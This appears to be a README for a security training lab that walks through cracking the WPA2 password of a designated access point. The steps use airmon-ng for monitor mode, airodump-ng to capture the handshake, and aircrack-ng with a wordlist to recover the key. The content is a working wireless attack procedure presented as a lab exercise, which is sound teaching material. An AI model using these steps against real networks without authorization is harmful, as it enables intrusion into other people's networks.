# RSSC2018-Wireless-Attack-Lab

## Attack Execution
Here we will walk through the process of attacking and gaining access to a wireless access point.

1. The iwconfig command will show any wireless cards in the system. 
```bash
iwconfig
```
The operating system recognizes a wireless interface named wlan0.

2. Enable the wireless interface.
```bash
ifconfig wlan0 up
```

3. Force the wireless card to scan and report on all wireless networks in the vicinity. The SSID you are trying to target for this lab is named ‘RSSC’. You need the MAC address and the channel that this AP is transmitting on.
```bash
iwlist wlan0 scanning
```

4. Change the wireless card to monitoring mode. This will allow the wireless card to examine all the packets in the air. We do this by creating a monitor interface using airmon-ng. Verify airmon-ng sees your wireless card.
```bash
airmon-ng 
```

5. Change the wireless card to monitoring mode. This will allow the wireless card to examine all the packets in the air.
```bash
airmon-ng start wlan0
```

6. Run the ifconfig command to verify the monitor interface is created. We can see wlan0mon was created.
```bash
ifconfig 
```

7. Use airodump-ng to capture the WPA2 handshake. The attacker will have to catch someone in the act of authenticating to get a valid capture. Airodump-ng will display a valid handshake when it captures it. It will display the handshake confirmation in the upper right-hand corner of the screen. Run this command for 15 seconds and then break out of it using ‘ctrl + C’.
```bash
airodump-ng wlan0mon –bssid <mac-address> --channel <channel> –write <filename>
```

8. We will use aircrack-ng with the dictionary file to crack the password. Your chances of breaking the password are dependent on the password file.
```bash
aircrack-ng <filename>.cap -a 2 -w <dictionary path>
```
